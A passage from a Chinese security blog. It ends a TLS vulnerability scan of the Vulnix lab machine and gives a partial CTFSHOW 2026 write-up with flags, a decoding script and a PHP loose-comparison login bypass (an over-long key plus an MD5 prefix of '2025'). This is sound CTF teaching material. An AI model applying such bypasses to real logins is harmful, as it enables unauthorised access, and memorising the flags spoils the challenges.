<td align="left"><strong>中危</strong>。DH组长度为1024位，强度偏弱，易受 Logjam 攻击。建议使用 2048位或更大的 DH 参数。</td>
</tr>
</tbody></table>
<hr>
<h3 id="表格二：检测到的漏洞-Vulnerabilities部分"><a href="#表格二：检测到的漏洞-Vulnerabilities部分" class="headerlink" title="表格二：检测到的漏洞 (Vulnerabilities部分)"></a>表格二：检测到的漏洞 (Vulnerabilities部分)</h3><table>
<thead>
<tr>
<th align="left">漏洞名称</th>
<th align="left">CVE ID</th>
<th align="left">状态 &#x2F; 结果</th>
<th align="left">严重性 &#x2F; 影响</th>
<th align="left">建议修复</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>Heartbleed</strong></td>
<td align="left">CVE-2014-0160</td>
<td align="left"><code>VULNERABLE (NOT ok)</code></td>
<td align="left"><strong>严重</strong>。服务器内存泄露，攻击者可窃取私钥、用户名、密码等敏感信息。</td>
<td align="left">升级 OpenSSL 到无此漏洞的版本 (1.0.1g 或更高)。</td>
</tr>
<tr>
<td align="left"><strong>CCS Injection</strong></td>
<td align="left">CVE-2014-0224</td>
<td align="left"><code>VULNERABLE (NOT ok)</code></td>
<td align="left"><strong>严重</strong>。中间人攻击者可解密和篡改TLS连接。</td>
<td align="left">升级 OpenSSL 到无此漏洞的版本 (1.0.1h 或更高)。</td>
</tr>
<tr>
<td align="left">Ticketbleed</td>
<td align="left">CVE-2016-9244</td>
<td align="left"><code>(applicable only for HTTP service)</code> (仅适用于HTTP服务)</td>
<td align="left">不适用于IMAP服务。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">Opossum</td>
<td align="left">CVE-2025-49812</td>
<td align="left"><code>(implemented currently for HTTP only)</code> (当前仅适用于HTTP)</td>
<td align="left">不适用于IMAP服务。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">ROBOT</td>
<td align="left"></td>
<td align="left"><code>not vulnerable (OK)</code></td>
<td align="left">正常，不受 ROBOT 攻击影响。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">Secure Renegotiation</td>
<td align="left">RFC 5746</td>
<td align="left"><code>supported (OK)</code></td>
<td align="left">正常，支持安全重新协商。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">Secure Client-Initiated Renegotiation</td>
<td align="left"></td>
<td align="left"><code>VULNERABLE (NOT ok), potential DoS threat</code></td>
<td align="left"><strong>中危</strong>。可能被恶意客户端利用进行拒绝服务 (DoS) 攻击。</td>
<td align="left">配置服务器禁用客户端发起的重新协商。</td>
</tr>
<tr>
<td align="left"><strong>CRIME, TLS</strong></td>
<td align="left">CVE-2012-4929</td>
<td align="left"><code>VULNERABLE but not using HTTP: probably no exploit known</code></td>
<td align="left"><strong>中危</strong>。存在 CRIME 漏洞。在非HTTP服务上直接利用较难，但仍是安全缺陷。</td>
<td align="left">禁用 TLS 压缩。</td>
</tr>
<tr>
<td align="left"><strong>POODLE, SSL</strong></td>
<td align="left">CVE-2014-3566</td>
<td align="left"><code>VULNERABLE (NOT ok)</code></td>
<td align="left"><strong>高危</strong>。攻击者可利用 SSLv3 和 CBC 密码套件解密敏感数据。</td>
<td align="left">禁用 SSLv3 协议。</td>
</tr>
<tr>
<td align="left">TLS_FALLBACK_SCSV</td>
<td align="left">RFC 7507</td>
<td align="left"><code>Downgrade attack prevention NOT supported and vulnerable to POODLE SSL</code></td>
<td align="left"><strong>高危</strong>。不支持 SCSV，使得中间人攻击者可强制降级到不安全的 SSLv3，再利用 POODLE 攻击。</td>
<td align="left">升级 OpenSSL 并启用 SCSV 保护。</td>
</tr>
<tr>
<td align="left"><strong>SWEET32</strong></td>
<td align="left">CVE-2016-2183, CVE-2016-6329</td>
<td align="left"><code>VULNERABLE, uses 64 bit block ciphers</code></td>
<td align="left"><strong>中危</strong>。使用 64 位块密码（如 3DES），可能导致在长时间连接下信息泄露。</td>
<td align="left">禁用 64 位块密码（如 3DES、IDEA）。</td>
</tr>
<tr>
<td align="left">FREAK</td>
<td align="left">CVE-2015-0204</td>
<td align="left"><code>not vulnerable (OK)</code></td>
<td align="left">正常，不受 FREAK 攻击影响。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left">DROWN</td>
<td align="left">CVE-2016-0800, CVE-2016-0703</td>
<td align="left"><code>not vulnerable on this host and port (OK)</code></td>
<td align="left">正常，不受 DROWN 攻击影响。<strong>注意</strong>：如果此证书在其他启用 SSLv2 的服务上使用，仍可能易受攻击。</td>
<td align="left">N&#x2F;A (此服务不受影响)</td>
</tr>
<tr>
<td align="left">LOGJAM</td>
<td align="left">CVE-2015-4000</td>
<td align="left"><code>not vulnerable (OK): no DH EXPORT ciphers. But: Unknown DH group (1024 bits)</code></td>
<td align="left">正常，不受 Logjam 攻击直接影响。但使用的 DH 组强度偏弱（1024位），存在潜在风险。</td>
<td align="left">使用 2048位或更大的 DH 参数。</td>
</tr>
<tr>
<td align="left"><strong>BEAST</strong></td>
<td align="left">CVE-2011-3389</td>
<td align="left"><code>VULNERABLE -- but also supports higher protocols TLSv1.1 TLSv1.2 (likely mitigated)</code></td>
<td align="left"><strong>中危</strong>。TLS 1.0 使用 CBC 模式，存在 BEAST 攻击条件。虽然有更高协议，但仍可能受影响。</td>
<td align="left">禁用 TLS 1.0，优先使用 TLS 1.2 及以上协议。</td>
</tr>
<tr>
<td align="left">LUCKY13</td>
<td align="left">CVE-2013-0169</td>
<td align="left"><code>potentially VULNERABLE, uses cipher block chaining (CBC) ciphers with TLS. Check patches</code></td>
<td align="left"><strong>低危</strong>。TLS 中使用 CBC 密码套件，存在定时攻击的可能性。</td>
<td align="left">更新相关补丁，禁用存在漏洞的 CBC 密码套件。</td>
</tr>
<tr>
<td align="left">Winshock</td>
<td align="left">CVE-2014-6321</td>
<td align="left"><code>not vulnerable (OK)</code></td>
<td align="left">正常，不受 Winshock 攻击影响。</td>
<td align="left">N&#x2F;A</td>
</tr>
<tr>
<td align="left"><strong>RC4</strong></td>
<td align="left">CVE-2013-2566, CVE-2015-2808</td>
<td align="left"><code>VULNERABLE (NOT ok): RC4-SHA, RC4-MD5</code></td>
<td align="left"><strong>高危</strong>。使用 RC4 流密码。RC4 已被证明存在严重缺陷，容易被攻击者破解。</td>
<td align="left">禁用所有 RC4 密码套件。</td>
</tr>
</tbody></table>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这份详尽的表格清晰地展示了 Vulnix 靶机在 SSL&#x2F;TLS 配置方面存在的<strong>大量且严重的漏洞和配置缺陷</strong>。从协议、密码套件到证书管理，几乎每个环节都存在问题。这使得该服务极易受到多种已知攻击的影响，是一个典型的存在“开放大门”的靶机。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>vulnix靶机</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</title>
    <url>/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h3 id="二-CTFSHOW-2026元旦跨年欢乐赛-CS2026-个人写的部分wp"><a href="#二-CTFSHOW-2026元旦跨年欢乐赛-CS2026-个人写的部分wp" class="headerlink" title="二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)"></a>二.CTFSHOW-2026元旦跨年欢乐赛-CS2026(个人写的部分wp)</h3><p>比赛网址：<a href="https://ctf.show/competitions/cs2026">https://ctf.show/competitions/cs2026</a></p>
<p>当前积分： 1150   已解出题目数：10   还是很菜的hhh(毕竟需要AI辅助)</p>
<h3 id="1-热身签到"><a href="#1-热身签到" class="headerlink" title="1.热身签到"></a>1.热身签到</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">元旦时，我二舅姥爷给我出的密码题</span><br></pre></td></tr></table></figure>

<p>压缩包里有个flag.txt,内容是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568</span><br></pre></td></tr></table></figure>

<p>这样的数字特征暗示我们可能要把这些数字转换成ASCII码，但数字个数太多了，有104位，所以不妨两位一组试试，</p>
<p>这里解释一下原因（我表达方式不太行AI生成一下），然后把每组数字先转为十进制（其实他本身就是了），每组转成对应的ASCII码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">104 是一个偶数！在密码学和编码学中，“偶数长度”是一个非常强烈的信号，它暗示着数据可能是成对处理的。为什么？因为计算机中最基础的单位“字节(Byte)”经常被表示为两个十六进制数，或者其他两位一组的形式。</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">原始分组</th>
<th align="center">十进制值</th>
<th align="center">对应字符</th>
</tr>
</thead>
<tbody><tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">52</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">66</td>
<td align="center">66</td>
<td align="center">B</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">49</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">57</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">57</td>
<td align="center">57</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">52</td>
<td align="center">52</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">56</td>
<td align="center">56</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">53</td>
<td align="center">53</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">70</td>
<td align="center">70</td>
<td align="center">F</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">48</td>
<td align="center">48</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">51</td>
<td align="center">51</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">54</td>
<td align="center">54</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">50</td>
<td align="center">50</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">49</td>
<td align="center">49</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">55</td>
<td align="center">55</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">68</td>
<td align="center">68</td>
<td align="center">D</td>
</tr>
</tbody></table>
<p>因此就有了一个十六进制字符串：（这里可以展开学学base16）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">63746673686F777B68617070795F323032365F776974685F637332303236217D</span><br></pre></td></tr></table></figure>

<p>放入随波逐流一键解密,flag就出来了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;happy_2026_with_cs2026!&#125;</span><br></pre></td></tr></table></figure>

<p>或者使用古法脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_cipher(cipher_text):</span><br><span class="line">    try:</span><br><span class="line">        # Step 1: 将字符串每2位切分，解析为十进制 ASCII 码，还原为中间字符串</span><br><span class="line">        # 例如: &quot;54&quot; -&gt; int(54) -&gt; chr(54) -&gt; &quot;6&quot;</span><br><span class="line">        intermediate_hex = &quot;&quot;.join(</span><br><span class="line">            [chr(int(cipher_text[i:i+2])) for i in range(0, len(cipher_text), 2)]</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;中间层 Hex 字符串: &#123;intermediate_hex&#125;&quot;)</span><br><span class="line">        # Step 2: 将中间的 Hex 字符串解码为最终明文</span><br><span class="line">        # bytes.fromhex() 是 Python 处理十六进制转换的高效方法</span><br><span class="line">        plaintext = bytes.fromhex(intermediate_hex).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        return plaintext</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;解密过程中出错: &#123;e&#125;&quot;</span><br><span class="line"># 输入数据</span><br><span class="line">cipher = &quot;54515552545455515456547055555566545654495548554855575370515051485150515453705555545755525456537054515551515051485150515450495568&quot;</span><br><span class="line"># 执行解密</span><br><span class="line">result = decrypt_cipher(cipher)</span><br><span class="line">print(f&quot;最终 Flag: &#123;result&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>flag也是可以出的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;happy_2026_with_cs2026!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-cs2026问卷调查"><a href="#2-cs2026问卷调查" class="headerlink" title="2.cs2026问卷调查"></a>2.cs2026问卷调查</h3><p>问卷调查即可得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;happy_2026&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-SafePassword"><a href="#3-SafePassword" class="headerlink" title="3.SafePassword"></a>3.SafePassword</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目描述</span><br><span class="line">1. 根据情报，J国近年来对我国进行了持续的渗透攻击，我方技术人员经过溯源，发现某个可疑网址。</span><br><span class="line"></span><br><span class="line">2. 该网址疑似为J国的情报组织任务分配中心，但是我方并没有拿到登陆口令，无法继续深入。</span><br><span class="line"></span><br><span class="line">3. 已经确认嫌疑账号用户名为jcenter，此人2025年加入该组织，登陆口令未知。</span><br></pre></td></tr></table></figure>

<p>题目附件是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">declare(strict_types=1);</span><br><span class="line">session_start();</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">const USER_NOT_FOUND       = 2000;</span><br><span class="line">const USER_DISABLED        = 2003;</span><br><span class="line">const CHANNEL_INVALID      = 2007;</span><br><span class="line">const CHANNEL_EXPIRED      = 2011;</span><br><span class="line">const CHANNEL_BLOCKED      = 2017;</span><br><span class="line">const VERIFY_FAILED        = 2025;</span><br><span class="line">const RATE_LIMITED         = 2033;</span><br><span class="line">const PERMISSION_DENIED    = 2048;</span><br><span class="line">const STATE_CONFLICT       = 2064;</span><br><span class="line">const LENGTH_ERROR        = 0x52C0FE;</span><br><span class="line"></span><br><span class="line">const ERROR_CODES = [</span><br><span class="line">    USER_NOT_FOUND,</span><br><span class="line">    USER_DISABLED,</span><br><span class="line">    CHANNEL_INVALID,</span><br><span class="line">    CHANNEL_EXPIRED,</span><br><span class="line">    CHANNEL_BLOCKED,</span><br><span class="line">    VERIFY_FAILED,</span><br><span class="line">    RATE_LIMITED,</span><br><span class="line">    PERMISSION_DENIED,</span><br><span class="line">    STATE_CONFLICT,</span><br><span class="line">    LENGTH_ERROR,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function ensureCsrf(): string</span><br><span class="line">&#123;</span><br><span class="line">    if (!isset($_SESSION[&#x27;csrf&#x27;]) || !is_string($_SESSION[&#x27;csrf&#x27;]) || $_SESSION[&#x27;csrf&#x27;] === &#x27;&#x27;) &#123;</span><br><span class="line">        $_SESSION[&#x27;csrf&#x27;] = bin2hex(random_bytes(16));</span><br><span class="line">    &#125;</span><br><span class="line">    return $_SESSION[&#x27;csrf&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function requirePostCsrf(): void</span><br><span class="line">&#123;</span><br><span class="line">    $csrf = $_POST[&#x27;csrf&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">    if (!is_string($csrf) || !isset($_SESSION[&#x27;csrf&#x27;]) || !is_string($_SESSION[&#x27;csrf&#x27;]) || !hash_equals($_SESSION[&#x27;csrf&#x27;], $csrf)) &#123;</span><br><span class="line">        http_response_code(400);</span><br><span class="line">        exit(&#x27;Bad CSRF&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function h(string $s): string</span><br><span class="line">&#123;</span><br><span class="line">    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, &#x27;UTF-8&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isLoggedIn(): bool</span><br><span class="line">&#123;</span><br><span class="line">    return isset($_SESSION[&#x27;authed&#x27;]) &amp;&amp; $_SESSION[&#x27;authed&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function inErrorCodes(int $code): bool</span><br><span class="line">&#123;</span><br><span class="line">    return in_array($code, ERROR_CODES, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function buildExpectedHash($channelKey): string</span><br><span class="line">&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        if (!preg_match(&#x27;/[\x00-\x08\x0B\x0C\x0E-\x1F]/&#x27;, $channelKey) &amp;&amp; strlen($channelKey) &lt; 64) &#123;</span><br><span class="line">            return md5(&#x27;ctfshow:&#x27; . $channelKey . &#x27;:verify&#x27; . $secret_salt);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            throw new RuntimeException(&#x27;&#x27;, LENGTH_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;catch(Throwable $e)&#123;</span><br><span class="line">        throw new RuntimeException(&#x27;&#x27;, VERIFY_FAILED);</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function pickErrorCode(Throwable $e): int</span><br><span class="line">&#123;</span><br><span class="line">    $code = (int)$e-&gt;getCode();</span><br><span class="line">    if (inErrorCodes($code)) &#123;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">    $idx = abs((int)crc32(get_class($e) . &#x27;|&#x27; . $e-&gt;getMessage())) % count(ERROR_CODES);</span><br><span class="line">    return ERROR_CODES[$idx];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getExpectedHash($channelKey)</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return buildExpectedHash($channelKey);</span><br><span class="line">    &#125; catch (Throwable $e) &#123;</span><br><span class="line">        return pickErrorCode($e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flash = &#x27;&#x27;;</span><br><span class="line">$flashType = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">$action = $_POST[&#x27;action&#x27;] ?? ($_GET[&#x27;action&#x27;] ?? &#x27;&#x27;);</span><br><span class="line">if (!is_string($action)) &#123;</span><br><span class="line">    $action = &#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">    if ($action === &#x27;login&#x27;) &#123;</span><br><span class="line">        requirePostCsrf();</span><br><span class="line"></span><br><span class="line">        $accessKey = $_POST[&#x27;access_key&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">        $channelKey = $_POST[&#x27;channel_key&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">        $expected = getExpectedHash($channelKey);</span><br><span class="line"></span><br><span class="line">        if (md5($accessKey) == $expected) &#123;</span><br><span class="line">            $_SESSION[&#x27;authed&#x27;] = true;</span><br><span class="line">            $flash = &#x27;验证通过：已解锁资料权限。&#x27;;</span><br><span class="line">            $flashType = &#x27;ok&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $_SESSION[&#x27;authed&#x27;] = false;</span><br><span class="line">            $flash = &#x27;验证失败：请检查访问密钥。&#x27;;</span><br><span class="line">            $flashType = &#x27;err&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; elseif ($action === &#x27;logout&#x27;) &#123;</span><br><span class="line">        requirePostCsrf();</span><br><span class="line">        $_SESSION = [];</span><br><span class="line">        if (ini_get(&#x27;session.use_cookies&#x27;)) &#123;</span><br><span class="line">            $params = session_get_cookie_params();</span><br><span class="line">            setcookie(session_name(), &#x27;&#x27;, time() - 42000, $params[&#x27;path&#x27;], $params[&#x27;domain&#x27;], (bool)$params[&#x27;secure&#x27;], (bool)$params[&#x27;httponly&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">        session_destroy();</span><br><span class="line">        session_start();</span><br><span class="line">        $flash = &#x27;已退出。&#x27;;</span><br><span class="line">        $flashType = &#x27;info&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$csrf = ensureCsrf();</span><br><span class="line"></span><br><span class="line">$flagText = &#x27;请先登陆&#x27;;</span><br><span class="line">if (isLoggedIn()) &#123;</span><br><span class="line">    if (isset($flag) &amp;&amp; is_string($flag) &amp;&amp; $flag !== &#x27;&#x27;) &#123;</span><br><span class="line">        $flagText = $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $flagText = &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$templatePath = __DIR__ . &#x27;/template.html&#x27;;</span><br><span class="line">if (!is_file($templatePath)) &#123;</span><br><span class="line">    http_response_code(500);</span><br><span class="line">    exit(&#x27;Template missing&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$html = file_get_contents($templatePath);</span><br><span class="line">if ($html === false) &#123;</span><br><span class="line">    http_response_code(500);</span><br><span class="line">    exit(&#x27;Template read error&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$authed = isLoggedIn();</span><br><span class="line"></span><br><span class="line">echo strtr($html, [</span><br><span class="line">    &#x27;&#123;&#123;CSRF&#125;&#125;&#x27; =&gt; h($csrf),</span><br><span class="line">    &#x27;&#123;&#123;AUTHED&#125;&#125;&#x27; =&gt; $authed ? &#x27;1&#x27; : &#x27;0&#x27;,</span><br><span class="line">    &#x27;&#123;&#123;FLAG&#125;&#125;&#x27; =&gt; $authed ? h($flagText) : &#x27;&#x27;,</span><br><span class="line">    &#x27;&#123;&#123;FLASH_TYPE&#125;&#125;&#x27; =&gt; h($flashType),</span><br><span class="line">    &#x27;&#123;&#123;FLASH_MSG&#125;&#125;&#x27; =&gt; h($flash),</span><br><span class="line">]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104150148352.png" class="" title="SafePassword登录界面">


<p>分析php代码,我们需要满足 index.php 中的登录条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (md5($accessKey) == $expected) &#123;</span><br><span class="line">    $_SESSION[&#x27;authed&#x27;] = true;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了 &#x3D;&#x3D;（弱比较）。如果 $expected 是一个数字（整数），PHP 会尝试将 md5($accessKey) 这个字符串转换为数字进行比较。</p>
<p>控制 $expected 的值：<br>$expected 的值来自于 getExpectedHash($channelKey)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getExpectedHash($channelKey) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return buildExpectedHash($channelKey);</span><br><span class="line">    &#125; catch (Throwable $e) &#123;</span><br><span class="line">        return pickErrorCode($e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>观察 buildExpectedHash 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function buildExpectedHash($channelKey): string &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (!preg_match(&#x27;/.../&#x27;, $channelKey) &amp;&amp; strlen($channelKey) &lt; 64) &#123;</span><br><span class="line">            // 正常情况返回 md5 字符串</span><br><span class="line">            return md5(&#x27;ctfshow:&#x27; . $channelKey . &#x27;:verify&#x27; . $secret_salt);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 如果长度 &gt;= 64，抛出 LENGTH_ERROR</span><br><span class="line">            throw new RuntimeException(&#x27;&#x27;, LENGTH_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(Throwable $e) &#123;</span><br><span class="line">        // 捕获所有异常（包括上面的 LENGTH_ERROR），转而抛出 VERIFY_FAILED (2025)</span><br><span class="line">        throw new RuntimeException(&#x27;&#x27;, VERIFY_FAILED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  如果我们提供的 channel_key 长度超过 64 个字符，内部 try 块会抛出异常。<br>  catch 块捕获后，重新抛出一个错误码为 VERIFY_FAILED（常量值为 2025）的异常。<br>  getExpectedHash 捕获这个新异常，调用 pickErrorCode，最终返回整数 2025。<br>  <strong>结论</strong>：只要 channel_key 长度大于 64，$expected 就会变成整数 2025。</p>
<p>  构造 $access_key：<br>  现在比较变成了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (md5($accessKey) == 2025) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个字符串 $accessKey，使得它的 MD5 值以 “2025” 开头，且第五位不是数字（即 a-f），这样 PHP 在进行弱类型转换时，会截取前面的 “2025” 将其转换为整数 2025，从而使等式成立。</p>
<p>例如：md5(“abc”) &#x3D; “2025a…” -&gt; 转换为数字 2025 -&gt; 2025 &#x3D;&#x3D; 2025 (True)。<br>注意：如果第五位是数字（如 “20251…”），则会被转换为 20251，不相等。</p>
<p>需要一个脚本计算 Access Key：</p>
